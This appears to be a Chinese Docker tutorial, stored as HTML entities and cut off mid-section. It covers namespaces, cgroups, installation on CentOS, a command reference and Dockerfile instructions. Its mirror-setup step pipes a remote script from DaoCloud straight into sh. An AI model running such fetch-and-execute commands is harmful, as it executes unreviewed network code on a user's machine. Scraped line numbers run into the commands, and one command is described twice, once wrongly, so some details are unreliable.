&#x955C;&#x50CF; &#x7C7B; 1.5 Docker&#x6280;&#x672F;&#x7684;&#x57FA;&#x7840;&#xFF1A; namespace&#xFF0C; &#x5BB9;&#x5668;&#x9694;&#x79BB;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x4FDD;&#x8BC1;A&#x5BB9;&#x5668;&#x770B;&#x4E0D;&#x5230;B&#x5BB9;&#x5668;&#x3002;6&#x4E2A;&#x547D;&#x540D;&#x7A7A;&#x95F4;&#xFF1A;User, Mnt, Network, UTS, IPC, PID cgroups, &#x5BB9;&#x5668;&#x8D44;&#x6E90;&#x7EDF;&#x8BA1;&#x548C;&#x9694;&#x79BB;&#x3002;&#x4E3B;&#x8981;&#x7528;&#x5230;&#x7684;cgroups&#x5B50;&#x7CFB;&#x7EDF;&#xFF1A;CPU, blkio, device, freezer, memory unionfs&#xFF0C; &#x5178;&#x578B;&#xFF1A;aufs/overlayfs&#xFF0C;&#x5206;&#x5C42;&#x955C;&#x50CF;&#x5B9E;&#x73B0;&#x7684;&#x57FA;&#x7840; 1.6 Docker&#x7EC4;&#x4EF6;&#xFF1A; docker Client&#x5BA2;&#x6237;&#x7AEF;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x5411;docker&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x7A0B;&#x53D1;&#x8D77;&#x8BF7;&#x6C42;&#xFF0C;&#x5982;&#x521B;&#x5EFA;&#x3001;&#x505C;&#x6B62;&#x3001;&#x9500;&#x6BC1;&#x5BB9;&#x5668;&#x7B49;&#x64CD;&#x4F5C; docker Server&#x670D;&#x52A1;&#x5668;&#x8FDB;&#x7A0B;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x5904;&#x7406;&#x6240;&#x6709;docker&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x7BA1;&#x7406;&#x6240;&#x6709;&#x5BB9;&#x5668; docker Registry&#x955C;&#x50CF;&#x4ED3;&#x5E93;&#x2014;&#x2014;&#x2014;&#x2014;&gt;&#x955C;&#x50CF;&#x5B58;&#x653E;&#x7684;&#x4E2D;&#x592E;&#x4ED3;&#x5E93;&#xFF0C;&#x53EF;&#x770B;&#x4F5C;&#x662F;&#x5B58;&#x653E;&#x4E8C;&#x8FDB;&#x5236;&#x7684;scm &#x4E8C;&#x3001;&#x5B89;&#x88C5;&#x90E8;&#x7F72;2.1 &#x51C6;&#x5907;&#x6761;&#x4EF6; &#x76EE;&#x524D;&#xFF0C;CentOS&#x4EC5;&#x53D1;&#x884C;&#x7248;&#x672C;&#x4E2D;&#x7684;&#x5185;&#x6838;&#x652F;&#x6301;Docker&#x3002;Docker&#x8FD0;&#x884C;&#x5728;CentOS 7&#x4E0A;&#xFF0C;&#x8981;&#x6C42;&#x7CFB;&#x7EDF;&#x4E3A;64&#x4F4D;&#x3001;&#x7CFB;&#x7EDF;&#x5185;&#x6838;&#x7248;&#x672C;&#x4E3A;3.10&#x4EE5;&#x4E0A;&#x3002;Docker&#x8FD0;&#x884C;&#x5728;CentOS-6.5&#x6216;&#x66F4;&#x9AD8;&#x7684;&#x7248;&#x672C;&#x7684;CentOS&#x4E0A;&#xFF0C;&#x8981;&#x6C42;&#x7CFB;&#x7EDF;&#x4E3A;64&#x4F4D;&#x3001;&#x7CFB;&#x7EDF;&#x5185;&#x6838;&#x7248;&#x672C;2.6.32-431&#x6216;&#x8005;&#x66F4;&#x9AD8;&#x7248;&#x672C; 2.2 &#x5B89;&#x88C5;docker123yum install docker -ysystemctl start dockersystemctl enable docker 2.3 &#x57FA;&#x672C;&#x547D;&#x4EE4;1docker search centos # &#x641C;&#x7D22;&#x955C;&#x50CF; &#x9ED8;&#x8BA4;&#x4ECE;&#x56FD;&#x5916;&#x62C9;&#x53D6;&#xFF0C;&#x901F;&#x5EA6;&#x5F88;&#x6162;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;daocloud&#x914D;&#x7F6E;&#x52A0;&#x901F;12345# &#x811A;&#x672C;&#x5199;&#x5165;curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://d6f11267.m.daocloud.ioecho &quot;{\\&quot;registry-mirrors\\&quot;: [\\&quot;http://d6f11267.m.daocloud.io\\&quot;]}&quot;&gt; /etc/docker/daemon.jsonsystemctl restart docker # &#x91CD;&#x542F;&#x751F;&#x6548; &#x6839;&#x636E;&#x9700;&#x6C42;&#x62C9;&#x53D6;&#x955C;&#x50CF; docker pull docker.io/ansible/centos7-ansible &#x62C9;&#x53D6;search&#x5230;&#x7684;&#x5168;&#x90E8;&#x955C;&#x50CF; 1for i in `docker search centos | awk &apos;!/NAME/{print $2}&apos;`; do docker pull $i; done &#x67E5;&#x770B;&#x672C;&#x5730;&#x955C;&#x50CF; docker images 2.4 &#x547D;&#x4EE4;&#x6574;&#x7406; &#x5BB9;&#x5668;&#x64CD;&#x4F5C;&#xFF1A;12345678docker create # &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;&#x4F46;&#x662F;&#x4E0D;&#x542F;&#x52A8;docker run # &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;&#x5E76;&#x542F;&#x52A8;docker stop # &#x505C;&#x6B62;&#x5BB9;&#x5668;&#x8FD0;&#x884C;&#xFF0C;&#x53D1;&#x9001;&#x4FE1;&#x53F7;SIGTERMdocker start # &#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x505C;&#x6B62;&#x72B6;&#x6001;&#x7684;&#x5BB9;&#x5668;docker rm # &#x5220;&#x9664;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;docker kill # &#x53D1;&#x9001;&#x4FE1;&#x53F7;&#x7ED9;&#x5BB9;&#x5668;&#xFF0C;&#x9ED8;&#x8BA4;SIGKILLdocker attach # &#x8FDE;&#x63A5;&#xFF08;&#x8FDB;&#x5165;&#xFF09;&#x5230;&#x4E00;&#x4E2A;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x7684;&#x5BB9;&#x5668;docker wait # &#x963B;&#x585E;&#x4E00;&#x4E2A;&#x5BB9;&#x5668;&#xFF0C;&#x77E5;&#x9053;&#x5BB9;&#x5668;&#x505C;&#x6B62;&#x8FD0;&#x884C; &#x83B7;&#x53D6;&#x5BB9;&#x5668;&#x4FE1;&#x606F;&#xFF1A;12345678docker ps # &#x663E;&#x793A;&#x72B6;&#x6001;&#x4E3A;&#x8FD0;&#x884C;&#xFF08;up&#xFF09;&#x7684;&#x5BB9;&#x5668;docker ps -a # &#x663E;&#x793A;&#x6240;&#x6709;&#x5BB9;&#x5668;&#xFF0C;&#x5305;&#x62EC;&#x8FD0;&#x884C;&#x4E2D;(up)&#x7684;&#x548C;&#x9000;&#x51FA;&#x7684;(exited&#xFF09;docker inspect # &#x6DF1;&#x5165;&#x5BB9;&#x5668;&#x5185;&#x90E8;&#x83B7;&#x53D6;&#x5BB9;&#x5668;&#x6240;&#x6709;&#x4FE1;&#x606F;docker logs # &#x67E5;&#x770B;&#x5BB9;&#x5668;&#x65E5;&#x5FD7;(stdout/stderr)docker events # &#x5F97;&#x5230;docker&#x670D;&#x52A1;&#x5668;&#x7684;&#x5B9E;&#x65F6;&#x4E8B;&#x4EF6;docker port # &#x663E;&#x793A;&#x5BB9;&#x5668;&#x7684;&#x7AEF;&#x53E3;&#x6620;&#x5C04;docker top # &#x663E;&#x793A;&#x5BB9;&#x5668;&#x7684;&#x8FDB;&#x7A0B;&#x4FE1;&#x606F;docker diff # &#x663E;&#x793A;&#x5BB9;&#x5668;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x524D;&#x540E;&#x53D8;&#x5316; &#x5BFC;&#x51FA;&#x5BB9;&#x5668;&#xFF1A;12docker cp # &#x4ECE;&#x5BB9;&#x5668;&#x91CC;&#x5411;&#x5916;&#x62F7;&#x8D1D;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;docker export # &#x5C06;&#x5BB9;&#x5668;&#x6574;&#x4E2A;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x5BFC;&#x51FA;&#x4E00;&#x4E2A;tar&#x5305;&#xFF0C;&#x4E0D;&#x5E26;layers&#x3001;tag&#x7B49;&#x4FE1;&#x606F; &#x6267;&#x884C;&#xFF1A; docker exec # &#x5728;&#x5BB9;&#x5668;&#x91CC;&#x6267;&#x884C;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x6267;&#x884C;bash&#x8FDB;&#x5165;&#x4EA4;&#x4E92;&#x5F0F; &#x955C;&#x50CF;&#x64CD;&#x4F5C;&#xFF1A;123456789docker images # &#x663E;&#x793A;&#x672C;&#x5730;&#x6240;&#x6709;&#x7684;&#x955C;&#x50CF;&#x5217;&#x8868;docker import # &#x4ECE;&#x4E00;&#x4E2A;tar&#x5305;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#xFF0C;&#x5F80;&#x5F80;&#x548C;export&#x7ED3;&#x5408;&#x4F7F;&#x7528;docker build # &#x4F7F;&#x7528;Dockerfile&#x521B;&#x5EFA;&#x955C;&#x50CF;&#xFF08;&#x63A8;&#x8350;&#xFF09;docker commit # &#x4ECE;&#x5BB9;&#x5668;&#x521B;&#x5EFA;&#x955C;&#x50CF;docker rmi # &#x5220;&#x9664;&#x4E00;&#x4E2A;&#x955C;&#x50CF;docker load # &#x4ECE;&#x4E00;&#x4E2A;tar&#x5305;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#xFF0C;&#x548C;save&#x914D;&#x5408;&#x4F7F;&#x7528;docker history # &#x5C06;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#x4FDD;&#x5B58;&#x4E3A;&#x4E00;&#x4E2A;tar&#xFF0C;&#x5E26;layers&#x548C;tag&#x4FE1;&#x606F;docker history # &#x663E;&#x793A;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#x7684;&#x5386;&#x53F2;&#x547D;&#x4EE4;docker tag # &#x4E3A;&#x955C;&#x50CF;&#x8D77;&#x4E00;&#x4E2A;&#x522B;&#x540D; &#x955C;&#x50CF;&#x4ED3;&#x5E93;&#xFF08;registry&#xFF09;&#x64CD;&#x4F5C;&#xFF1A;1234docker login # &#x767B;&#x5F55;&#x5230;&#x4E00;&#x4E2A;registrydocker search # &#x4ECE;registry&#x4ED3;&#x5E93;&#x641C;&#x7D22;&#x955C;&#x50CF;docker pull # &#x4ECE;&#x4ED3;&#x5E93;&#x4E0B;&#x8F7D;&#x955C;&#x50CF;&#x5230;&#x672C;&#x5730;docker push # &#x5C06;&#x4E00;&#x4E2A;&#x955C;&#x50CF;push&#x5230;registry&#x4ED3;&#x5E93;&#x4E2D; 2.5 &#x7B80;&#x5355;&#x5B9E;&#x8DF5;&#x64CD;&#x4F5C; &#x8FD0;&#x884C;&#x5E76;&#x8FDB;&#x5165;&#x5BB9;&#x5668;&#x64CD;&#x4F5C;&#xFF1A;1docker run -i -t docker.io/1832990/centos6.5 /bin/bash -t&#x8868;&#x793A;&#x5728;&#x65B0;&#x5BB9;&#x5668;&#x5185;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x4F2A;&#x7EC8;&#x7AEF;&#x6216;&#x7EC8;&#x7AEF; -i&#x8868;&#x793A;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x5BF9;&#x5BB9;&#x5668;&#x5185;&#x7684;(STDIN)&#x8FDB;&#x884C;&#x4EA4;&#x4E92; -d&#x8868;&#x793A;&#x5C06;&#x5BB9;&#x5668;&#x5728;&#x540E;&#x53F0;&#x8FD0;&#x884C;&#xFF1B; /bin/bash&#x5728;&#x5BB9;&#x5668;&#x5185;&#x542F;&#x52A8;bash shell &#x6240;&#x4EE5;&#x5F53;&#x5BB9;&#x5668;&#xFF08;container&#xFF09;&#x542F;&#x52A8;&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x83B7;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x547D;&#x4EE4;&#x63D0;&#x793A;&#x7B26;&#xFF1A; &#x5728;&#x5BB9;&#x5668;&#x5185;&#x6211;&#x4EEC;&#x5B89;&#x88C5;mysql&#x5E76;&#x8BBE;&#x7F6E;&#x5F00;&#x673A;&#x81EA;&#x542F;&#x52A8;&#xFF0C;&#x5C06;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x955C;&#x50CF;&#x63D0;&#x4EA4;&#xFF1A;12docker ps -l #&#x67E5;&#x8BE2;&#x5BB9;&#x5668;IDdocker commit -m &quot;&#x529F;&#x80FD;&quot; -a &quot;&#x7528;&#x6237;&#x4FE1;&#x606F;&quot; ID tag #&#x63D0;&#x4EA4;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x955C;&#x50CF; 12docker inspect ID # &#x67E5;&#x770B;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;docker push ID # &#x4E0A;&#x4F20;docker&#x955C;&#x50CF; &#x5229;&#x7528;DockerFile&#x521B;&#x5EFA;&#x955C;&#x50CF;&#x4F7F;&#x7528;docker build&#xFF0C;&#x9700;&#x8981;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;dockerfile&#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x4E00;&#x7EC4;&#x6307;&#x4EE4;&#x6765;&#x544A;&#x8BC9;docker&#x5982;&#x4F55;&#x6784;&#x5EFA;&#x955C;&#x50CF;123456789mkdir DockerFilecd DockerFilecat &gt; Dockerfile &lt;&lt;EOFFROM 603dd3515fccMAINTAINER Dcoker xuelRUN yum install mysql mysql-server -yRUN mkdir /etc/sysconfig/networkRUN /etc/init.d/mysqld startEOF docker build -t &quot;centos6.8:mysqld&quot; &#x3002; -t&#x6307;&#x5B9A;repository&#x4E0E;tag .&#x6307;&#x5B9A;Dockerfile&#x7684;&#x8DEF;&#x5F84; &#x6CE8;&#x610F;&#x4E00;&#x4E2A;&#x955C;&#x50CF;&#x4E0D;&#x80FD;&#x8D85;&#x8FC7;127&#x5C42; &#x6B64;&#x5916;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x5229;&#x7528;ADD&#x547D;&#x4EE4;&#x590D;&#x5236;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x5230;&#x955C;&#x50CF;&#xFF1B;&#x7528;EXPOSE&#x547D;&#x4EE4;&#x6765;&#x5411;&#x5916;&#x90E8;&#x5F00;&#x653E;&#x7AEF;&#x53E3;&#xFF1B;&#x7528;CMD&#x547D;&#x4EE4;&#x6765;&#x63CF;&#x8FF0;&#x5BB9;&#x5668;&#x542F;&#x52A8;&#x540E;&#x8FD0;&#x884C;&#x7684;&#x7A0B;&#x5E8F;&#x7B49;&#x3002;CMD [&#x201C;/usr/sbin/apachectl&#x201D;, &#x201C;-D&#x201D;, &#x201C;FOREGROUND&#x201D;] 2.6 Docker&#x6587;&#x4EF6;&#x8BE6;&#x89E3; Dockerfile&#x7684;&#x6307;&#x4EE4;&#x6839;&#x636E;&#x4F5C;&#x7528;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#xFF0C;&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#x548C;&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#x3002;&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;&#x6784;&#x5EFA;image&#xFF0C;&#x5176;&#x6307;&#x5B9A;&#x7684;&#x64CD;&#x4F5C;&#x4E0D;&#x4F1A;&#x518D;&#x8FD0;&#x884C;image&#x7684;&#x5BB9;&#x5668;&#x4E0A;&#x6267;&#x884C;&#xFF1B;&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;image&#x5C5E;&#x6027;&#xFF0C;&#x5176;&#x6307;&#x5B9A;&#x7684;&#x64CD;&#x4F5C;&#x5C06;&#x5728;&#x8FD0;&#x884C;image&#x7684;&#x5BB9;&#x5668;&#x4E2D;&#x6267;&#x884C;&#x3002; FROM &#xFF08;&#x6307;&#x5B9A;&#x57FA;&#x7840;image&#xFF09;&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x4E14;&#x9700;&#x8981;&#x5728;Dockerfile&#x5176;&#x4ED6;&#x6307;&#x4EE4;&#x7684;&#x524D;&#x9762;&#x3002;&#x540E;&#x7EED;&#x7684;&#x6307;&#x4EE4;&#x7248;&#x672C;&#x90FD;&#x4F9D;&#x8D56;&#x4E8E;&#x8BE5;&#x6307;&#x4EE4;&#x7684;image&#x3002;FROM&#x6307;&#x4EE4;&#x6307;&#x5B9A;&#x7684;&#x57FA;&#x7840;image&#x53EF;&#x4EE5;&#x662F;&#x5B98;&#x65B9;&#x8FDC;&#x7A0B;&#x4ED3;&#x5E93;&#x4E2D;&#x7684;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4F4D;&#x4E8E;&#x672C;&#x5730;&#x4ED3;&#x5E93; &#x8BE5;&#x6307;&#x4EE4;&#x6709;&#x4E24;&#x79CD;&#x683C;&#x5F0F;&#xFF1A;12FROM &lt;iamge&gt; # &#x6307;&#x5B9A;&#x57FA;&#x7840;image&#x4E3A;&#x8BE5;image&#x7684;&#x6700;&#x540E;&#x4FEE;&#x6539;&#x7248;&#x672C;FROM &lt;image&gt;:&lt;tag&gt; # &#x6307;&#x5B9A;&#x57FA;&#x7840;&#x4E3A;&#x8BE5;image&#x7684;&#x4E00;&#x4E2A;tag&#x7248;&#x672C; MAINTAINER&#xFF08;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x955C;&#x50CF;&#x521B;&#x5EFA;&#x8005;&#x4FE1;&#x606F;&#xFF09;&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;&#x5C06;image&#x7684;&#x5236;&#x4F5C;&#x8005;&#x76F8;&#x5173;&#x7684;&#x4FE1;&#x606F;&#x5199;&#x5165;&#x5230;image&#x4E2D;&#x3002;&#x5F53;&#x6211;&#x4EEC;&#x5BF9;&#x8BE5;image&#x6267;&#x884C;docker inspect&#x547D;&#x4EE4;&#x65F6;&#xFF0C;&#x8F93;&#x51FA;&#x4E2D;&#x6709;&#x76F8;&#x5E94;&#x7684;&#x5B57;&#x6BB5;&#x8BB0;&#x5F55;&#x8BE5;&#x4FE1;&#x606F;&#x3002; MAINTAINER RUN(&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x7528;)&#x6784;&#x5EFA;&#x6307;&#x4EE4;&#xFF0C;RUN&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x4EFB;&#x4F55;&#x88AB;&#x57FA;&#x7840;image&#x652F;&#x6301;&#x7684;&#x547D;&#x4EE4;&#x3002;&#x5982;&#x57FA;&#x7840;image&#x9009;&#x62E9;&#x4E86;ubuntu&#xFF0C;&#x90A3;&#x4E48;&#x8F6F;&#x4EF6;&#x7BA1;&#x7406;&#x90E8;&#x5206;&#x53EA;&#x80FD;&#x4F7F;&#x7528;ubuntu&#x7684;&#x547D;&#x4EE4;&#x3002; 12RUN &lt;command&gt; (the command is run in a shell - `/bin/sh -c`)RUN [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot; ...] (exec form) CMD(&#x8BBE;&#x7F6E;container&#x542F;&#x52A8;&#x65F6;&#x6267;&#x884C;&#x7684;&#x64CD;&#x4F5C;)&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x7528;&#x4E8E;container&#x542F;&#x52A8;&#x65F6;&#x6307;&#x5B9A;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x8BE5;&#x64CD;&#x4F5C;&#x53EF;&#x4EE5;&#x662F;&#x6267;&#x884C;&#x81EA;&#x5B9A;&#x4E49;&#x811A;&#x672C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x6267;&#x884C;&#x7CFB;&#x7EDF;&#x547D;&#x4EE4;&#x3002;&#x8BE5;&#x6307;&#x4EE4;&#x53EA;&#x80FD;&#x5728;&#x6587;&#x4EF6;&#x4E2D;&#x7EA2;&#x5B58;&#x5728;&#x4E00;&#x6B21;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x591A;&#x4E2A;&#xFF0C;&#x5219;&#x6267;&#x884C;&#x6700;&#x540E;&#x4E00;&#x6761;&#x3002; 12CMD [&quot;executablel&quot;, &quot;param1&quot;, &quot;param2&quot;] (like an exec, this is the preferred form)CMD command param1 para2 (as a shell) ENTRYPOINT&#x6307;&#x5B9A;&#x7684;&#x662F;&#x4E00;&#x4E2A;&#x53EF;&#x6267;&#x884C;&#x811A;&#x672C;&#x6216;&#x8005;&#x7A0B;&#x5E8F;&#x7684;&#x8DEF;&#x5F84;&#xFF0C;&#x8BE5;&#x6307;&#x5B9A;&#x7684;&#x811A;&#x672C;&#x6216;&#x8005;&#x7A0B;&#x5E8F;&#x5C06;&#x4F1A;&#x4EE5;param1&#x548C;param2&#x4F5C;&#x4E3A;&#x53C2;&#x6570;&#x6267;&#x884C;&#x3002;&#x6240;&#x4EE5;&#x5982;&#x679C;CMD&#x6307;&#x4EE4;&#x4F7F;&#x7528;&#x4E0A;&#x9762;&#x7684;&#x5F62;&#x5F0F;&#xFF0C;&#x90A3;&#x4E48;Dockerfile&#x4E2D;&#x5FC5;&#x987B;&#x8981;&#x6709;&#x914D;&#x5957;&#x7684;ENTRYPOINT&#x3002;&#x5F53;Dockerfile&#x5236;&#x5B9A;&#x4E86;ENTRYPOINT&#xFF0C;&#x90A3;&#x4E48;&#x4F7F;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x683C;&#x5F0F;&#xFF1A;1CMD [&quot;param1&quot;, &quot;param2&quot;] (as defualt paramenters to ENTRYPOINT) ENTRYPOINT&#xFF0C;&#x6307;&#x5B9A;&#x5BB9;&#x5668;&#x542F;&#x52A8;&#x65F6;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x591A;&#x6B21;&#x8BBE;&#x7F6E;&#xFF0C;&#x4F46;&#x662F;&#x53EA;&#x6709;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#x6709;&#x6548;&#x3002; 12ENTRYPOINT [&quot;executable&quot;, &quot;param1&quot;, &quot;param2&quot;](like an exec, the preferred fomr)ENTRYPOINT command param1 param2 (as a shell) &#x8BE5;&#x6307;&#x4EE4;&#x7684;&#x4F7F;&#x7528;&#x5206;&#x4E3A;&#x4E24;&#x79CD;&#x60C5;&#x51B5;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x72EC;&#x81EA;&#x4F7F;&#x7528;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x548C;CMD&#x914D;&#x5408;&#x4F7F;&#x7528;&#x3002;&#x5F53;&#x72EC;&#x81EA;&#x4F7F;&#x7528;&#x65F6;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x8FD8;&#x4F7F;&#x7528;&#x4E86;CMD&#x547D;&#x4EE4;&#x4E14;CMD&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x53EF;&#x6267;&#x884C;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x90A3;&#x4E48;CMD&#x6307;&#x4EE4;&#x548C;ENTRYPOINT&#x4F1A;&#x76F8;&#x4E92;&#x8986;&#x76D6;&#x53EA;&#x6709;&#x6700;&#x540E;&#x4E00;&#x4E2A;CMD&#x6216;&#x8005;ENTRYPINT&#x6709;&#x6548;&#x3002;123# CMD&#x6307;&#x4EE4;&#x5C06;&#x4E0D;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x53EA;&#x6709;ENTRYPOINT&#x6307;&#x4EE4;&#x88AB;&#x6267;&#x884C;CMD echo &quot;Hello, World!&quot;ENTRYPOINT ls -l &#x53E6;&#x4E00;&#x79CD;&#x7528;&#x6CD5;&#x548C;CMD&#x6307;&#x4EE4;&#x914D;&#x5408;&#x4F7F;&#x7528;&#x6307;&#x5B9A;&#x7684;ENTRYPIINT&#x7684;&#x9ED8;&#x8BA4;&#x53C2;&#x6570;&#xFF0C;&#x8FD9;&#x65F6;CMD&#x6307;&#x4EE4;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x53EF;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x4EC5;&#x4EC5;&#x662F;&#x53C2;&#x6570;&#x90E8;&#x5206;&#xFF1B;ENTRYPOINT&#x6307;&#x4EE4;&#x53EA;&#x80FD;&#x4F7F;&#x7528;JSON&#x65B9;&#x5F0F;&#x6307;&#x5B9A;&#x6267;&#x884C;&#x547D;&#x4EE4;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x6307;&#x5B9A;&#x53C2;&#x6570;&#x3002;123FROM ubuntuCMD [&quot;-l&quot;]ENTRYPOINT [&quot;/usr/bin/ls&quot;] USER&#xFF08;&#x8BBE;&#x7F6E;container&#x5BB9;&#x5668;&#x7684;&#x7528;&#x6237;&#xFF09;&#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x8BBE;&#x7F6E;&#x542F;&#x52A8;&#x5BB9;&#x5668;&#x7684;&#x7528;&#x6237;&#xFF0C;&#x9ED8;&#x8BA4;&#x662F;root&#x7528;&#x6237; 12345# &#x6307;&#x5B9A;memcached&#x7684;&#x8FD0;&#x884C;&#x7528;&#x6237;ENTRYPOINT [&quot;memcached&quot;]USER daemon&#x6216;ENTRYPOINT [&quot;memcached&quot;, &quot;-u&quot;, &quot;daemon&quot;] EXPOSE&#xFF08;&#x6307;&#x5B9A;&#x5BB9;&#x5668;&#x9700;&#x8981;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;&#x7AEF;&#x53E3;&#xFF09; &#x8BBE;&#x7F6E;&#x6307;&#x4EE4;&#xFF0C;&#x8BE5;&#x6307;&#x4EE4;&#x4F1A;&#x5C06;&#x5BB9;&#x5668;&#x4E2D;&#x7684;&#x7AEF;&#x53E3;&#x6620;&#x5C04;&#x6210;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x67D0;&#x4E2A;&#x7AEF;&#x53E3;&#x3002;&#x5F53;&#x4F60;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0D;&#x662F;&#x7528;&#x5BB9;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x800C;&#x662F;&#x4F7F;&#x7528;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;IP&#x5730;&#x5740;&#x548C;&#x6620;&#x5C04;&#x540E;&#x7684;&#x7AEF;&#x53E3;&#x3002;&#x8981;&#x5B8C;&#x6210;&#x6574;&#x4E2A;&#x64CD;&#x4F5C;&#x9700;&#x8981;&#x4E24;&#x4E2A;&#x6B65;&#x9AA4;&#xFF0C;&#x9996;&#x5148;&#x5728;Dockerfile&#x4F7F;&#x7528;EXPOSE&#x8BBE;&#x7F6E;&#x9700;&#x8981;&#x6620;&#x5C04;&#x7684;&#x5BB9;&#x5668;&#x7AEF;&#x53E3;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#x6307;&#x5B9A;-p&#x9009;&#x9879;&#x52A0;&#x4E0A;EXPOSE&#x8BBE;&#x7F6E;&#x7684;&#x7AEF;&#x53E3;&#xFF0C;&#x8FD9;&#x6837;EXPOSE&#x8BBE;&#x7F6E;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x4F1A;&#x88AB;&#x968F;&#x673A;&#x6620;&#x5C04;&#x6210;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;&#x53F7;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x9700;&#x8981;&#x6620;&#x5C04;&#x5230;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x7684;&#x90A3;&#x4E2A;&#x7AEF;&#x53E3;&#xFF0C;&#x8FD9;&#x65F6;&#x8981;&#x786E;&#x4FDD;&#x5BBF;&#x4E3B;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x7AEF;&#x53E3;&#x53F7;&#x6CA1;&#x6709;&#x88AB;&#x4F7F;&#x7528;&#x3002;EXPOSE&#x6307;&#x4EE4;&#x53EF;&#x4EE5;&#x4E00;&#x6B21;&#x8BBE;&#x7F6E;&#x591A;&#x4E2A;&#x7AEF;&#x53E3;&#x53F7;&#xFF0C;&#x54CD;&#x5E94;&#x7684;&#x8FD0;&#x884C;&#x5BB9;&#x5668;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x53EF;&#x4EE5;&#x914D;&#x5957;&#x7684;&#x591A;&#x6B21;&#x4F7F;&#x7528;-p&#x9009;&#x9879;&#x3002;1234567891011# &#x6620;&#x5C04;&#x4E00;&#x4E2A;&#x7AEF;&#x53E3;EXPOSE port1# 